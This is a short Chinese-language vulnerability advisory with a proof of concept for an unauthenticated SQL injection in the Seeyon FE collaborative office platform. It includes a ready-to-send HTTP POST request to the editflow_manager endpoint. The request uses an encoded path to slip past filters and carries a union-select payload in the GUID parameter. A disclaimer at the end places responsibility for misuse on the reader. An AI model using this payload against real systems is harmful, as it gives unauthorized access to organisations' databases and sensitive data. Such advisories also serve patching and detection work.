# 致远互联FE editflow_manager SQL注入漏洞

>致远互联FE协作办公平台是一款为企业提供全方位协同办公解决方案的产品。它集成了多个功能模块，旨在帮助企业实现高效的只团队协作、信息共享和文档管理。

## 漏洞概述

致远互联FE协作办公平台存在SQL注入漏洞，未授权的攻击者可以通过此漏洞执行sql命令，获取数据库敏感信息。

## 来源

[https://github.com/Vme18000yuan/FreePOC/blob/master/poc/neclei/seeyon-fe-editflow_manager-sql.yaml](https://github.com/Vme18000yuan/FreePOC/blob/master/poc/neclei/seeyon-fe-editflow_manager-sql.yaml)

## 漏洞影响范围

-   致远互联FE协作办公平台

## 漏洞类型

SQL注入

## POC

```http
POST /sysform/003/editflow_manager.j%73p HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
​
option=2&GUID=-1%27+union+select+@@version--+
```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。



